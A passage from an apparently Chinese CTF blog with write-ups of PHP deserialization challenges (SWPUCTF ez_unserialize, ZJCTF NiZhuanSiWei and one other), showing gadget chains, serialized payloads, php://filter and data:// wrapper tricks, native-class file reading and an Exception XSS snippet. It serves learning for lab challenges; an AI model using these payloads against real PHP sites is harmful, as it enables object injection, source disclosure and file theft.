class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakea</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>(<span class="hljs-string">&#x27;one class&#x27;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>(<span class="hljs-string">&#x27;ing&#x27;</span>,<span class="hljs-string">&#x27;department&#x27;</span>)),<span class="hljs-string">&#x27;ong&#x27;</span>);<br><br><span class="hljs-comment">// $a=new school();</span><br><span class="hljs-comment">// $b=new classroom();</span><br><span class="hljs-comment">// $c=new teacher();</span><br><span class="hljs-comment">// $a-&gt;department=$b;</span><br><span class="hljs-comment">// $b-&gt;leader=$c;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>用得到的payload传get的’d’</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">d</span>=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9<br></code></pre></td></tr></table></figure><p>此时由于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//会唤醒</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>此时传入的post a和b就会拼接进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>试了一下上次的file_get_contents，不行，试想了下，直接拼进去会得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file_get_contents&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//而上次的是</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>这个这个new可能要意味着是类(class)的表达；<br>看wp<br>要用hp的内置类SplFileObject来读取文件内容;  </p><h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类  "></a>原生类  </h2><p>php原生类，应该指的是php内置有，不用定义的类  </p><p>Error&#x2F;Exception XSS</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>SplFileObject 读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure><p>DirectoryIterator 遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>         <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>FilesystemIterator 遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-17</title>
    <link href="/2025/03/23/note-17/"/>
    <url>/2025/03/23/note-17/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-ez-unserialize"><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1><p>没想到我也有能秒反序列化的一天，还以为永远入不了门了<br>拿到题目发现只有一个静态页面<br>然后dirsearch扫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs log">[13:31:24] Starting:<br>[13:31:28] 403 -  309B  - /.ht_wsr.txt<br>[13:31:28] 403 -  312B  - /.htaccess.bak1<br>[13:31:28] 403 -  312B  - /.htaccess.save<br>[13:31:28] 403 -  314B  - /.htaccess.sample<br>[13:31:28] 403 -  310B  - /.htaccess_sc<br>[13:31:28] 403 -  313B  - /.htaccess_extra<br>[13:31:28] 403 -  312B  - /.htaccess.orig<br>[13:31:28] 403 -  310B  - /.htaccessBAK<br>[13:31:28] 403 -  312B  - /.htaccess_orig<br>[13:31:28] 403 -  310B  - /.htaccessOLD<br>[13:31:28] 403 -  311B  - /.htaccessOLD2<br>[13:31:28] 403 -  302B  - /.htm<br>[13:31:28] 403 -  303B  - /.html<br>[13:31:28] 403 -  312B  - /.htpasswd_test<br>[13:31:28] 403 -  309B  - /.httr-oauth<br>[13:31:28] 403 -  308B  - /.htpasswds<br>[13:31:45] 200 -    0B  - /flag.php<br>[13:31:56] 200 -   35B  - /robots.txt<br>[13:31:57] 403 -  311B  - /server-status<br>[13:31:57] 403 -  312B  - /server-status/<br></code></pre></td></tr></table></figure><p>直接访问flag.php无果，<br>访问robots.txt  </p><h2 id="notice"><a href="#notice" class="headerlink" title="notice"></a>notice</h2><p>robots大概作用应该是用来告诉搜索引擎不能爬取哪些页面，没有强制性作用</p><p>在robots里发现&#x2F;cl45s.php<br>访问得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br></code></pre></td></tr></table></figure><p>写了个payload，一次成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">&quot;user&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">&quot;123456&quot;</span>;<br>    &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">wllm</span>();<br><span class="hljs-variable">$a</span>-&gt;admin=<span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;passwd=<span class="hljs-string">&quot;ctf&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">///运行得到:O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>直接get传得到flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;<br></code></pre></td></tr></table></figure><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没看懂为啥get传好像传不进去<br>去看大佬的wp</p><p><a href="https://www.nssctf.cn/note/set/3017">https://www.nssctf.cn/note/set/3017</a>   </p><p>原来是这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a><em><strong>file_get_contents()</strong></em></h2><p>file_get_contents() 函数在 PHP 中用于读取文件内容或获取远程资源的内容。<br>它可以读取通过 GET 方法传入的 URL 或文件路径，但不能直接读取通过 GET 方法传入的字符串参数。</p><p>所以像这样传入字符串是没用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?text=welcome to the zjctf<br></code></pre></td></tr></table></figure><p>法一：  </p><p>通过data:&#x2F;&#x2F;伪协议，让字符串传递进去。这里传递纯文本，payload：text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>法二:<br>通过php:&#x2F;&#x2F;input伪协议构造POST请求，传进去的字符串就放在post请求的payload上</p><p>我是选法一了，毕竟直接在url上就能完成<br>data:&#x2F;&#x2F; 协议：<br>data:&#x2F;&#x2F; 协议允许你通过数据 URI 来访问数据。你可以将数据直接嵌入到 URL 中，而不需要创建一个实际的文件。<br>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 打印 &quot;I love PHP&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">// text/plain，表示的是文本</span><br><br><span class="hljs-comment">// text/plain;base64, 若纯文本没用可用base64编码</span><br></code></pre></td></tr></table></figure><p>这样就能传入welcome to the zjctf了</p><p>接下来  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>(); <br></code></pre></td></tr></table></figure><blockquote><p>检查$file变量中是否包含字符串”flag”。  </p></blockquote><blockquote><p>preg_match(“&#x2F;flag&#x2F;“,$file)：使用正则表达式匹配$file中是否包含”flag”。  </p></blockquote><blockquote><p>如果匹配到”flag”，输出”Not now!”并终止脚本执行。  </p></blockquote><p>由于并不是过滤字符，没法用双写绕过了</p><p>这样先看下面，有提示一个useless.php</p><blockquote><p>根据反序列化代码我们可以推测题目想让我们构造反序列化POC触发useless.php里面的类，<br>要想构造POC我们得知道这个类长什么样，<br>于是问题的矛盾指向了useless.php的源码，<br>这里只能通过php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php来查看加密后的源码（不加密会被当成php执行）</p></blockquote><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//n</span>ode4.anna.nssctf.cn:<span class="hljs-number">28681</span>/?text=data:<span class="hljs-regexp">//</span>text/plain,welcome<span class="hljs-variable">%2</span>0to<span class="hljs-variable">%2</span>0the<span class="hljs-variable">%20zjctf</span>&amp;file=php:<span class="hljs-regexp">//</span>filter/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=useless.php<br></code></pre></td></tr></table></figure><p>得到useless.php得内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>那么最后就有:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the 